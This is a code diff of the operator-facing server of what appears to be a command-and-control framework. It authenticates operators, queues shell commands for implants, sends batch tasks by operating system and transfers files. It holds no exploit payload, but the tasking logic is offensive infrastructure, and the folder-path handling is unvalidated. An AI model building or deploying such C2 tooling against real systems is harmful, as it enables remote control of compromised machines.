@@ -32,160 +32,187 @@
 char USERNAME[0x100];
 
 int autheticate(MYSQL *con, SSL *ssl) {
+    	char *auth = recv_json(ssl);
+    	if (!auth) {
+    	    	return -1;
+    	}
+    	cJSON *creds = cJSON_Parse(auth);
 
-    char *auth = recv_json(ssl);
-    if (!auth) {
-        return -1;
-    }
-    cJSON *creds = cJSON_Parse(auth);
+    	if (creds == NULL) {
+    	   	log_message(LOG_WARN, "Failed to parse JSON from Operator (Authenticating): %s", auth);
+    	   	cJSON_Delete(creds);
+    	   	return -1;
+    	}
 
-    if (creds == NULL) {
-        log_message(LOG_WARN, "Failed to parse JSON from Operator (Authenticating): %s", auth);
-        cJSON_Delete(creds);
-        return -1;
-    }
+    	cJSON *username = cJSON_GetObjectItem(creds, "username");
 
-    cJSON *username = cJSON_GetObjectItem(creds, "username");
-    
-    if (username == NULL || !cJSON_IsString(username)) {
-        log_message(LOG_WARN, "Missing or invalid 'Username' field in JSON\n");
-        cJSON_Delete(creds);
-        return -1;
-    }
-    cJSON *password = cJSON_GetObjectItem(creds, "password");
-    if (password == NULL || !cJSON_IsString(password)) {
-        log_message(LOG_WARN, "Missing or invalid 'Password' field in JSON");
-        cJSON_Delete(creds);
-        return -1;
-    }
+    	if (username == NULL || !cJSON_IsString(username)) {
+    	    	log_message(LOG_WARN, "Missing or invalid 'Username' field in JSON\n");
+    	    	cJSON_Delete(creds);
+    	    	return -1;
+    	}
+    	cJSON *password = cJSON_GetObjectItem(creds, "password");
+    	if (password == NULL || !cJSON_IsString(password)) {
+    	    	log_message(LOG_WARN, "Missing or invalid 'Password' field in JSON");
+    	    	cJSON_Delete(creds);
+    	    	return -1;
+    	}
 
-    cJSON *reply = cJSON_CreateObject();
-    if (reply == NULL) {
-        
-        log_message(LOG_WARN, "Failed to create cJSON object [Authentication]");
-        cJSON_Delete(creds);
-        return -1;
-    }
+    	cJSON *reply = cJSON_CreateObject();
+    	if (reply == NULL) {
+		log_message(LOG_WARN, "Failed to create cJSON object [Authentication]");
+    	    	cJSON_Delete(creds);
+    	    	return -1;
+    	}
 
-    if (authenticate_operator(con, username->valuestring, password->valuestring) != 0) {
-        cJSON_AddStringToObject(reply, "authenticated", "false");
-        char *reply_ = cJSON_Print(reply);
-        //send(sock, reply_, strlen(reply_), 0);
-        //SSL_write(ssl, reply_, strlen(reply_));
-        send_json(ssl, reply_);
-        log_message(LOG_WARN, "Operator Failed To Authenticate");
-        free(reply_);
-        //free(reply);
-        cJSON_Delete(reply);
-        cJSON_Delete(creds);
-        return -1;   
-    }
+    	if (authenticate_operator(con, username->valuestring, password->valuestring) != 0) {
+    	    	cJSON_AddStringToObject(reply, "authenticated", "false");
+    	    	char *reply_ = cJSON_Print(reply);
+    	    	//send(sock, reply_, strlen(reply_), 0);
+    	    	//SSL_write(ssl, reply_, strlen(reply_));
+    	    	send_json(ssl, reply_);
+    	    	log_message(LOG_WARN, "Operator Failed To Authenticate");
+    	    	free(reply_);
+    	    	//free(reply);
+    	    	cJSON_Delete(reply);
+    	    	cJSON_Delete(creds);
+    	    	return -1;   
+    	}
 
-    cJSON_AddStringToObject(reply, "authenticated", "true");
-    char *reply_ = cJSON_Print(reply);
-    //send(sock, reply_, strlen(reply_), 0);
-    //SSL_write(ssl, reply_, strlen(reply_));
-    send_json(ssl, reply_);
-    
-    strncpy(USERNAME, username->valuestring, sizeof(USERNAME) -1);
-    USERNAME[sizeof(USERNAME) - 1] = '\0';
-    log_message(LOG_INFO, "Operator [%s] Authenticated Successfully",USERNAME);
-    free(reply_);
-    cJSON_Delete(reply);
+    	cJSON_AddStringToObject(reply, "authenticated", "true");
+    	char *reply_ = cJSON_Print(reply);
+    	//send(sock, reply_, strlen(reply_), 0);
+    	//SSL_write(ssl, reply_, strlen(reply_));
+    	send_json(ssl, reply_);
 
-    cJSON_Delete(creds);
-    return 0;
-}
+    	strncpy(USERNAME, username->valuestring, sizeof(USERNAME) -1);
+    	USERNAME[sizeof(USERNAME) - 1] = '\0';
+    	log_message(LOG_INFO, "Operator [%s] Authenticated Successfully",USERNAME);
+    	free(reply_);
+    	cJSON_Delete(reply);
+
+    	cJSON_Delete(creds);
+    	return 0;
+}	
 
 char *verify_id(MYSQL *con, char *id) {
-    cJSON *valid_id = cJSON_CreateObject();
-            
-    if (check_implant_id(con, id) == 0) {
-        cJSON_AddStringToObject(valid_id, "valid_id", "false");
-        char *reply = cJSON_Print(valid_id);
-        cJSON_Delete(valid_id);
-        log_message(LOG_WARN, "Requested Implant ID %s Does Not Exists",id);
-        return reply;
-    } else {
-        cJSON_AddStringToObject(valid_id, "valid_id", "true");
-        char *reply = cJSON_Print(valid_id);
-        cJSON_Delete(valid_id);
-        //log_message(LOG_WARN, "Requested Implant ID %s does exists",id);
-        return reply;
-    }
+    	cJSON *valid_id = cJSON_CreateObject();
+	
+    	if (check_implant_id(con, id) == 0) {
+    	    	cJSON_AddStringToObject(valid_id, "valid_id", "false");
+    	    	char *reply = cJSON_Print(valid_id);
+    	    	cJSON_Delete(valid_id);
+    	    	log_message(LOG_WARN, "Requested Implant ID %s Does Not Exists",id);
+    	    	return reply;
+    	} else {
+    	    	cJSON_AddStringToObject(valid_id, "valid_id", "true");
+    	    	char *reply = cJSON_Print(valid_id);
+    	    	cJSON_Delete(valid_id);
+    	    	//log_message(LOG_WARN, "Requested Implant ID %s does exists",id);
+    	    	return reply;
+    	}
 }
 
 char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
     
-    if (!rinfo) {
-        return strdup("{\"error\": \"Invalid JSON\"}");
-    }
+    	if (!rinfo) {
+    		return strdup("{\"error\": \"Invalid JSON\"}");
+    	}
 
-    cJSON *implant_id = cJSON_GetObjectItem(rinfo, "implant_id");
-    if (!implant_id) {
-        return NULL;
-    }
-    char *implant_id_value = implant_id->valuestring;
+    	cJSON *implant_id = cJSON_GetObjectItem(rinfo, "implant_id");
+    	if (!implant_id) {
+    	    	return NULL;
+    	}
+    	char *implant_id_value = implant_id->valuestring;
 
-    cJSON *action = cJSON_GetObjectItem(rinfo, "action");
+    	cJSON *action = cJSON_GetObjectItem(rinfo, "action");
 
-    if (!action || !cJSON_IsString(action) || !implant_id || !cJSON_IsString(implant_id)) {
-        return strdup("{\"error\": \"Missing or invalid action/implant_id\"}");
-    }
+    	if (!action || !cJSON_IsString(action) || !implant_id || !cJSON_IsString(implant_id)) {
+    		return strdup("{\"error\": \"Missing or invalid action/implant_id\"}");
+    	}
 
-    const char *action_value = action->valuestring;
+    	const char *action_value = action->valuestring;
 
 
-    char *data = malloc(MAX_INFO);
-    if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");
+    	char *data = malloc(MAX_INFO);	
+    	if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");
 
-    if (strcmp(action_value, "list-tasks") == 0) {
-        snprintf(data, MAX_INFO, "%s", tasks_per_implant(con, implant_id_value));
-    }  else if (strcmp(action_value, "response-task") == 0) {
-        cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");
-        if (!task || !cJSON_IsNumber(task)) {
-            free(data);
-            return strdup("{\"error\": \"Invalid task_id\"}");
-        }
-        char *data_t = cmd_and_response(con, task->valueint);
-        snprintf(data, MAX_INFO, "%s", data_t);
-        free(data_t);
-        // send the data
-        //
-    } 
-    else if (strcmp(action_value, "new-task") == 0) {
-        cJSON *command = cJSON_GetObjectItem(rinfo, "command");
-        if (!command || !cJSON_IsString(command)) {
-            free(data);
-            return strdup("{\"error\": \"Invalid command\"}");
-        }
-        new_tasks(con, implant_id_value, command->valuestring);
-        free(data);
-        cJSON *tasks_added = cJSON_CreateObject();
-        cJSON_AddStringToObject(tasks_added, "status", "task_added");
-        data = cJSON_Print(tasks_added);
-        cJSON_Delete(tasks_added);
-    } else if (strcmp(action_value, "update-task") == 0) {
-        cJSON *command = cJSON_GetObjectItem(rinfo, "command");
-        if (!command || !cJSON_IsString(command)) {
-            free(data);
-            return strdup("{\"error\": \"Invalid command\"}");
-        }
-        cJSON *task_id = cJSON_GetObjectItem(rinfo, "task_id");
-        if (!task_id || !cJSON_IsNumber(task_id)) {
-            free(data);
-            return strdup("{\"error\": \"Invalid Task Id\"}");
-        }   
-        if (update_task(con, task_id->valueint, command->valuestring) == false) {
-            free(data);
-            return strdup("{\"update\": \"false\"}");
-        } 
-        return strdup("{\"update\": \"true\"}");
-    } else {
-        free(data);
-        return strdup("{\"error\": \"Invalid action\"}");
-    }
-    return data;
+    	if (strcmp(action_value, "list-tasks") == 0) {	
+    	    	snprintf(data, MAX_INFO, "%s", tasks_per_implant(con, implant_id_value));
+    	}  else if (strcmp(action_value, "response-task") == 0) {	
+    	    	cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");	
+    	    	if (!task || !cJSON_IsNumber(task)) {	
+    	    	    	free(data);	
+    	    	    	return strdup("{\"error\": \"Invalid task_id\"}");	
+    	    	}	
+    	    	char *data_t = cmd_and_response(con, task->valueint);	
+    	    	snprintf(data, MAX_INFO, "%s", data_t);	
+    	    	free(data_t);	
+    	    
+    	} 	
+    	else if (strcmp(action_value, "new-task") == 0) {	
+    	    	cJSON *command = cJSON_GetObjectItem(rinfo, "command");	
+    	    	if (!command || !cJSON_IsString(command)) {	
+    	    	    	free(data);	
+    	    	    	return strdup("{\"error\": \"Invalid command\"}");	
+    	    	}	
+    	    	new_tasks(con, implant_id_value, command->valuestring);	
+    	    	free(data);	
+    	    	cJSON *tasks_added = cJSON_CreateObject();	
+    	    	cJSON_AddStringToObject(tasks_added, "status", "task_added");	
+    	    	data = cJSON_Print(tasks_added);	
+    	    	cJSON_Delete(tasks_added);	
+    	} else if (strcmp(action_value, "update-task") == 0) {	
+    	    	cJSON *command = cJSON_GetObjectItem(rinfo, "command");	
+    	    	if (!command || !cJSON_IsString(command)) {	
+    	    	    	free(data);	
+    	    	    	return strdup("{\"error\": \"Invalid command\"}");	
+    	    	}	
+    	    	cJSON *task_id = cJSON_GetObjectItem(rinfo, "task_id");	
+    	    	if (!task_id || !cJSON_IsNumber(task_id)) {	
+    	    	    	free(data);	
+    	    	    	return strdup("{\"error\": \"Invalid Task Id\"}");	
+    	    	}   	
+    	    	if (update_task(con, task_id->valueint, command->valuestring) == false) {
+    	    	    	free(data);	
+    	    	    	return strdup("{\"update\": \"false\"}");	
+    	    	} 	
+    	    	return strdup("{\"update\": \"true\"}");	
+    	} else {	
+    	    	free(data);	
+    	    	return strdup("{\"error\": \"Invalid action\"}");	
+    	}	
+    	return data;	
+}	
+
+void check_user(SSL *ssl, MYSQL *con) {
+	cJSON *response = cJSON_CreateObject();
+	bool user = check_operator(con);
+	cJSON_AddBoolToObject(response, "user_exists", user);
+	char *info = cJSON_Print(response);
+	send_json(ssl, info);
+	cJSON_Delete(response);
+	free(info);
+
+	if (!user) {
+		add_user(ssl, con);
+	}	
+}
+
+void add_user(SSL *ssl, MYSQL *con) {
+	char *get_creds = recv_json(ssl);
+	cJSON *creds = cJSON_Parse(get_creds);
+	cJSON *username = cJSON_GetObjectItem(creds, "username");
+	cJSON *password  = cJSON_GetObjectItem(creds, "password");
+	char *salt = generate_salt();
+	char *crypt_res  = crypt(password->valuestring, salt);
+	char password_hash[128];
+    	snprintf(password_hash, sizeof(password_hash), "%s", crypt_res);
+	add_operator(con, username->valuestring, password_hash);
+	//free(get_creds);
+	//free(salt);
+	//free(crypt_res);
+	cJSON_Delete(creds);
 }
 
 
@@ -205,7 +232,8 @@ void *operator_handler(void *Args) {
         log_message(LOG_WARN, "DB Connection Lost, Reconnecting...");
         return NULL;
     }
-    // 3 tries
+    check_user(ssl, con);
+
     int try = 1;
     do {
         if (autheticate(con, ssl) == 0) {
@@ -214,149 +242,124 @@ void *operator_handler(void *Args) {
         try++;
     } while (try <= 3);
 
-
     return NULL;
-    
-    
     // operator requesting infomartion or add new tasks
     START:
-    while (1) {
+	while (1) {
+        	char *buffer = recv_json(ssl);
+        	if (!buffer) { 
+        	    	return NULL;
+        	}
+	
+        	cJSON *requested_info = cJSON_Parse(buffer);
+        	if (requested_info == NULL) {
+        	    	log_message(LOG_ERROR, "Failed To Parse JSON [Operator Handler]: %s", buffer);
+        	    	return NULL;
+        	}
 
-        char *buffer = recv_json(ssl);
-        if (!buffer) { 
-            return NULL;
-         }
-         
-        cJSON *requested_info = cJSON_Parse(buffer);
-        if (requested_info == NULL) {
-            
-            log_message(LOG_ERROR, "Failed To Parse JSON [Operator Handler]: %s", buffer);
-            return NULL;
-        }
+        	cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
+        	if (about == NULL || !cJSON_IsString(about) || about->valuestring == NULL) {
+        	    	log_message(LOG_ERROR, "Missing or Invalid 'Info' field in the JSON [Operator Handler]");
+        	    	cJSON_Delete(requested_info);
+        	    	return NULL;
+        	}
 
-        cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
-        if (about == NULL || !cJSON_IsString(about) || about->valuestring == NULL) {
-            
-            log_message(LOG_ERROR, "Missing or Invalid 'Info' field in the JSON [Operator Handler]");
-            cJSON_Delete(requested_info);
-            return NULL;
-        }
+        	if (strncmp(about->valuestring, "Implants", 8) == 0) { // all info about implants
+        	    	char *implants = GetData(con, "Implants");
+        	    	if (!implants) {
+        	    	    	log_message(LOG_ERROR, "Failed to get Implant data from database");
+        	    	    	continue;
+        	    	} 
 
-        if (strncmp(about->valuestring, "Implants", 8) == 0) { // all info about implants
-            char *implants = GetData(con, "Implants");
-            //printf("Caller \n%s\n---\n", implants);
-
-            	if (!implants) {
-            	    	log_message(LOG_ERROR, "Failed to get Implant data from database");
-            	    	continue;
-            	} 
-
-        send_json(ssl, implants);
-        free(implants);
-            
-        } else if (strcmp(about->valuestring, "Tasks") == 0) {
-            	char *tasks = GetData(con, "Tasks");
-            	if (tasks == NULL) {
-            		continue;
-            	}
-            	//SSL_write(ssl, tasks, strlen(tasks));
-            	send_json(ssl, tasks);
-            	free(tasks);
-        } else if (strcmp(about->valuestring, "implant_id") == 0) {
-            	char *data = interact_with_implant(con, requested_info);
-            	if (data == NULL) {
-            	    //send(sock, "ERROR", strlen("ERROR"), 0);
-            	    //SSL_write(ssl, reply_, sizeof("ERROR"));    
-			continue;
-            	}
-            //send(sock, data, strlen(data), 0);
-            //SSL_write(ssl, data, strlen(data));
-            send_json(ssl, data);
-            free(data);
-        } else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
-            log_message(LOG_INFO, "Operator [%s] Exiting", USERNAME);
-            return NULL;
-        } else if (strncmp(about->valuestring, "verify_implant", sizeof("verify_implant")) == 0) {
-            cJSON *implant_id = cJSON_GetObjectItem(requested_info, "implant_id");
-           
-            char *is_valid = verify_id(con, implant_id->valuestring);
-            if (is_valid == NULL) {
-                log_message(LOG_WARN, "IS vallid is null");
-                continue;
-            }            
-            //SSL_write(ssl, is_valid, strlen(is_valid));
-            send_json(ssl, is_valid);
-            free(is_valid);
-        } else if (strcmp(about->valuestring, "files") == 0) {
-            cJSON *option = cJSON_GetObjectItem(requested_info, "option");
-            if (strcmp(option->valuestring, "upload") == 0) {
-                operator_file_download(ssl);
-            } else if (strcmp(option->valuestring, "download") == 0) {
-                operator_file_upload(ssl);
-            } else if (strcmp(option->valuestring, "view") == 0) {
-                cJSON *folder = cJSON_GetObjectItem(requested_info, "folder");
-                if (!folder || !cJSON_IsString(folder)) {
-                    log_message(LOG_ERROR, "Invalid Folder");
-                    SSL_write(ssl, "INVALID REQUEST", 15);
-                    continue;
-                }
-                char base_path[BUFFER_SIZE];
-                snprintf(base_path, BUFFER_SIZE, "./uploads/%s", folder->valuestring);
-                cJSON *list = list_files(base_path);
-                if (!list) {
-                    log_message(LOG_ERROR, "Failed To get data from list_files");
-                    //SSL_write(ssl, "NO DATA", 7);
-                    send_json(ssl, "No Data");
-                    continue;
-                }
-                char *arr = cJSON_Print(list);
-                cJSON_Delete(list);
-                send_json(ssl, arr);
-                free(arr);
-            }
-        } else if (strcmp(about->valuestring, "Batch Tasks") == 0) {
-                cJSON *os = cJSON_GetObjectItem(requested_info, "os");
-                cJSON *command = cJSON_GetObjectItem(requested_info, "command");
-				bool added;
-				if (!os) {
-                    			added = batch_tasks(con, command->valuestring, NULL);
-                		} else {
-					added = batch_tasks(con, command->valuestring, os->valuestring);
-				}
-				cJSON *isValid = cJSON_CreateObject();
-				cJSON_AddBoolToObject(isValid, "Added", added);
-				char *info = cJSON_Print(isValid);
-				send_json(ssl, info);
-				free(info);
-				cJSON_Delete(isValid);
-				
-        } else if (strcmp(about->valuestring, "check operator") == 0) {
-		cJSON *response = cJSON_CreateObject();
-		bool user = check_operator(con);
-		cJSON_AddBoolToObject(response, "User Exists", user);
+        	send_json(ssl, implants);
+        	free(implants);
 		
-		char *info = cJSON_Print(response);
-		send_json(ssl, info);
-		free(info);
-		cJSON_Delete(response);
+        	} else if (strcmp(about->valuestring, "Tasks") == 0) {
+        	    	char *tasks = GetData(con, "Tasks");
+        	    	if (tasks == NULL) {
+        	    		continue;
+        	    	}
+        	    	//SSL_write(ssl, tasks, strlen(tasks));
+        	    	send_json(ssl, tasks);
+        	    	free(tasks);
+        	} else if (strcmp(about->valuestring, "implant_id") == 0) {
+        	    	char *data = interact_with_implant(con, requested_info);
+        	    	if (data == NULL) {
+        	    	    //send(sock, "ERROR", strlen("ERROR"), 0);
+        	    	    //SSL_write(ssl, reply_, sizeof("ERROR"));    
+				continue;
+        	    	}
+        	    //send(sock, data, strlen(data), 0);
+        	    //SSL_write(ssl, data, strlen(data));
+        	    send_json(ssl, data);
+        	    free(data);
+        	} else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
+        	    log_message(LOG_INFO, "Operator [%s] Exiting", USERNAME);
+        	    return NULL;
+        	} else if (strncmp(about->valuestring, "verify_implant", sizeof("verify_implant")) == 0) {
+        	    cJSON *implant_id = cJSON_GetObjectItem(requested_info, "implant_id");
+		
+        	    char *is_valid = verify_id(con, implant_id->valuestring);
+        	    if (is_valid == NULL) {
+        	        log_message(LOG_WARN, "IS vallid is null");
+        	        continue;
+        	    }            
+        	    //SSL_write(ssl, is_valid, strlen(is_valid));
+        	    send_json(ssl, is_valid);
+        	    free(is_valid);
+        	} else if (strcmp(about->valuestring, "files") == 0) {
+        	    cJSON *option = cJSON_GetObjectItem(requested_info, "option");
+        	    if (strcmp(option->valuestring, "upload") == 0) {
+        	        operator_file_download(ssl);
+        	    } else if (strcmp(option->valuestring, "download") == 0) {
+        	        operator_file_upload(ssl);
+        	    } else if (strcmp(option->valuestring, "view") == 0) {
+        	        cJSON *folder = cJSON_GetObjectItem(requested_info, "folder");
+        	        if (!folder || !cJSON_IsString(folder)) {
+        	            log_message(LOG_ERROR, "Invalid Folder");
+        	            SSL_write(ssl, "INVALID REQUEST", 15);
+        	            continue;
+        	        }
+        	        char base_path[BUFFER_SIZE];
+        	        snprintf(base_path, BUFFER_SIZE, "./uploads/%s", folder->valuestring);
+        	        cJSON *list = list_files(base_path);
+        	        if (!list) {
+        	            log_message(LOG_ERROR, "Failed To get data from list_files");
+        	            //SSL_write(ssl, "NO DATA", 7);
+        	            send_json(ssl, "No Data");
+        	            continue;
+        	        }
+        	        char *arr = cJSON_Print(list);
+        	        cJSON_Delete(list);
+        	        send_json(ssl, arr);
+        	        free(arr);
+        	    }
+        	} else if (strcmp(about->valuestring, "batch_tasks") == 0) {
+        	        cJSON *os = cJSON_GetObjectItem(requested_info, "os");
+        	        cJSON *command = cJSON_GetObjectItem(requested_info, "command");
+					bool added;
+					if (!os) {
+        	            			added = batch_tasks(con, command->valuestring, NULL);
+        	        		} else {
+						added = batch_tasks(con, command->valuestring, os->valuestring);
+					}
+					cJSON *isValid = cJSON_CreateObject();
+					cJSON_AddBoolToObject(isValid, "Added", added);
+					char *info = cJSON_Print(isValid);
+					send_json(ssl, info);
+					free(info);
+					cJSON_Delete(isValid);
 
-		if (!user) {
-			char *get_creds = recv_json(ssl);
-			cJSON *creds = cJSON_Parse(get_creds);
-			cJSON *username = cJSON_GetObjectItem(creds, "username");
-			cJSON *password  = cJSON_GetObjectItem(creds, "password_hash");
-
-			char *salt = generate_salt();
-			char *password_hash  = crypt(password->valuestring, salt);
-			add_operator(con, username->valuestring, password_hash);
+        	} else if (strncmp(about->valuestring, "add_operator", strlen("add_operator")) == 0) {
+			add_user(ssl, con);
 		}
-	}
-        cJSON_Delete(requested_info);
-    } 
-    log_message(LOG_INFO, "Closed connection");
-    SSL_free(ssl);
+        	
+		cJSON_Delete(requested_info);
+    	} 
+    	log_message(LOG_INFO, "Closed connection");
+    	SSL_free(ssl);
 
-    return NULL;
+    	return NULL;
 }
 
 int operator_file_download(SSL *ssl) {
@@ -411,32 +414,32 @@ int operator_file_download(SSL *ssl) {
     	//    	received += bytesRead;
     	//}
         while (received < filesize) {
-    bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
+    	bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
 
-    if (bytesRead <= 0) {
-        int err = SSL_get_error(ssl, bytesRead);
-        if (err == SSL_ERROR_ZERO_RETURN) {
-            log_message(LOG_ERROR, "SSL connection closed cleanly.\n");
-            break;
-        } else {
-           log_message(LOG_ERROR, "SSL_read error: %d\n", err);
-            break;
-        }
-    }
-    ssize_t bytesWritten;
-    ssize_t totalWritten = 0;
-    while (totalWritten < bytesRead) {
-        bytesWritten = write(fd, contents + totalWritten, bytesRead - totalWritten);
-        if (bytesWritten < 0) {
-            perror("write");
-            close(fd);
-            SSL_shutdown(ssl);
-            return -1;
-        }
-        totalWritten += bytesWritten;
-    }
+    	if (bytesRead <= 0) {
+    	    	int err = SSL_get_error(ssl, bytesRead);
+    	    	if (err == SSL_ERROR_ZERO_RETURN) {
+    	        	log_message(LOG_ERROR, "SSL connection closed cleanly.\n");
+    	      	  break;
+    	    	} else {
+    	    		log_message(LOG_ERROR, "SSL_read error: %d\n", err);
+    	    	    	break;
+    	    	}
+    	}
+    	ssize_t bytesWritten;
+    	ssize_t totalWritten = 0;
+    	while (totalWritten < bytesRead) {
+        	bytesWritten = write(fd, contents + totalWritten, bytesRead - totalWritten);
+        	if (bytesWritten < 0) {
+        	    	perror("write");
+        	    	close(fd);
+        	    	SSL_shutdown(ssl);
+        	    	return -1;
+        	}
+        	totalWritten += bytesWritten;
+    	}
 
-    received += bytesRead;
+    	received += bytesRead;
 }
 
     	log_message(LOG_INFO, "Wrote data to file : %s ", filepath);
